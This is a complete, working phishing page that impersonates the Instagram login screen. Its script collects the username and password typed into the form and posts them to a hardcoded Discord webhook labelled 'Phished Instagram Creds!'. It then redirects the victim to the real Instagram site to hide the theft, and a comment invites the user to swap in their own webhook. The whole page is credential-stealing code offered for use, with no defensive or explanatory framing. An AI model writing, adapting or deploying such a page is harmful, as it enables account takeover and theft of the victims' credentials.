<!DOCTYPE html>
<html>
<head>
<title>Instagram</title>
<style>
body { background: #f0f0f0; font-family: Arial; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; }
.container { background:white; padding:20px; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); width:300px; text-align:center; }
input { width:100%; padding:10px; margin:10px 0; border:1px solid #dbdbdb; }
button { width:100%; background:#0095f6; color:white; border:none; padding:10px; }
</style>
</head>
<body>
<div class="container">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" width="100">
<h2>Log in to Instagram</h2>
<form id="phish">
<input type="text" id="user" placeholder="Phone number, username, or email" required>
<input type="password" id="pass" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
</div>

<script>
document.getElementById('phish').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('user').value;
    const password = document.getElementById('pass').value;
    const webhook = 'https://discord.com/api/webhooks/1512813408871911445/tkjnVhLpIjmnBML2UGDKuNQjXmG_geq6NrWW17REkJ65UjVTdjqO1otSqgvZM8BRZIuY'; // Replace with your webhook
    
    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            content: `**Phished Instagram Creds!**\n**Username/Email:** ${username}\n**Password:** ${password}\n**IP:** ${'client IP via additional script if wanted'}`
        })
    }).then(() => {
        window.location.href = 'https://www.instagram.com'; // Redirect to real IG
    });
});
</script>
</body>
</html>
